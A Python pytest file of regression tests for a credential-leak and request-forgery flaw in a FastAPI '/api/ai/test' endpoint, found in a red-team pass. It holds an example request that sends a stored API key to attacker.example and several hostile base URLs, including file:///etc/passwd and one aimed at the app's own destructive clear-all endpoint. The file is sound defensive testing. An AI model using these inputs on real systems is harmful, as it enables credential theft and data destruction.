"""`POST /api/ai/test` must never mail the stored API key to a host the caller chose.

Found in a red-team pass on the running instance. The handler fell back to the STORED key whenever the
request body's key was blank or masked, and took `baseUrl` from the body unvalidated — so one
unauthenticated request:

    POST /api/ai/test  {"baseUrl": "https://attacker.example/v1"}

sent the analyst's real credential to that host as `Authorization: Bearer`. Two things made it worse:
`LLMClient._http_error` embedded ~300 bytes of the upstream response body and `test()` returned that
string in its 200 reply (blind request-forgery upgraded to one that reads the answer back), and
`candidate_bases()` fans one URL into up to six requests plus a `GET {base}/models` probe.

There is deliberately NO private-IP blocklist here: the analyst's real gateway is on 10.0.0.109, and a
control that refuses their working setup is a control they switch off.
"""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from app import config
from app.config import update_settings
from app.main import app

STORED_BASE = "https://gateway.internal.example/v1"
STORED_KEY = "sk-stored-secret-do-not-leak"


@pytest.fixture()
def client(monkeypatch):
    seen: list[dict] = []

    class RecordingClient:
        def __init__(self, provider, model, base_url, api_key, **kw):
            seen.append({"provider": provider, "model": model, "baseUrl": base_url, "apiKey": api_key})

        async def test(self):
            return True, "ok", 1

    from app.routers import ai as ai_router
    monkeypatch.setattr(ai_router, "LLMClient", RecordingClient)
    with TestClient(app) as c:
        # settings.json is restored BYTE FOR BYTE, not patched back: `update_settings` deliberately
        # treats an empty apiKey as "keep the stored one", so patching back a workspace that had no key
        # would leave STORED_KEY configured for every test that runs after this file.
        raw = config.SETTINGS_PATH.read_bytes() if config.SETTINGS_PATH.exists() else None
        update_settings({"ai": {"provider": "openai", "baseUrl": STORED_BASE, "apiKey": STORED_KEY,
                                "model": "m"}})
        c.seen = seen          # type: ignore[attr-defined]
        try:
            yield c
        finally:
            if raw is None:
                config.reset_settings()
            else:
                config.SETTINGS_PATH.write_bytes(raw)
                config._settings = None
                config.get_settings()


def test_the_stored_key_never_goes_to_a_different_host(client):
    res = client.post("/api/ai/test", json={"provider": "openai", "model": "m",
                                            "baseUrl": "https://attacker.example/v1"})
    assert res.status_code == 200
    assert client.seen, "the client was never constructed — the test is not exercising the path"
    sent = client.seen[-1]
    assert sent["baseUrl"] == "https://attacker.example/v1"
    assert sent["apiKey"] == "", f"the stored API key was sent to another host: {sent['apiKey']!r}"
    assert STORED_KEY not in str(res.json())


def test_a_masked_key_does_not_reopen_the_hole(client):
    """The UI sends back the masked value it was shown; that must not count as 'use the stored one'."""
    client.post("/api/ai/test", json={"provider": "openai", "model": "m",
                                      "baseUrl": "https://attacker.example/v1",
                                      "apiKey": "••••1234"})
    assert client.seen[-1]["apiKey"] == ""


def test_testing_the_saved_endpoint_still_uses_the_saved_key(client):
    """The legitimate use — 'test the setup I already saved' — is unchanged."""
    client.post("/api/ai/test", json={"provider": "openai", "model": "m", "baseUrl": STORED_BASE})
    assert client.seen[-1]["apiKey"] == STORED_KEY


def test_a_key_supplied_in_the_request_is_still_honoured(client):
    """Testing a NEW endpoint before saving it is the whole point of the button — with ITS own key."""
    client.post("/api/ai/test", json={"provider": "openai", "model": "m",
                                      "baseUrl": "https://new-gw.example/v1", "apiKey": "sk-typed"})
    assert client.seen[-1]["apiKey"] == "sk-typed"


@pytest.mark.parametrize("bad", [
    "file:///etc/passwd",
    "ftp://host/v1",
    # the persistent variant: the client APPENDS its API path, so everything after '?' stays in the
    # query string and Iris can be pointed at its own destructive endpoint
    "http://127.0.0.1:8000/api/admin/clear-all?x=",
    "https://gw.example/v1#frag",
])
def test_a_base_url_that_is_not_a_plain_http_endpoint_is_refused(client, bad):
    res = client.post("/api/ai/test", json={"provider": "openai", "model": "m", "baseUrl": bad})
    assert res.status_code == 400
    assert not client.seen, "a refused base URL must not reach the HTTP client at all"


def test_an_upstream_response_body_is_not_echoed_to_the_caller():
    """`test()` returns this string in a 200, so anything from the upstream host is disclosed."""
    from app.ai.client import LLMClient
    c = LLMClient("openai", "some-model", "https://gw.example/v1", "sk-test")
    msg = c._http_error(404, '{"secret":"internal-metadata-token"}',
                        "https://gw.example/v1/chat/completions")
    assert "internal-metadata-token" not in msg
    # ...while still being useful for fixing a wrong base URL, which is why it names them
    assert "https://gw.example/v1/chat/completions" in msg and "some-model" in msg
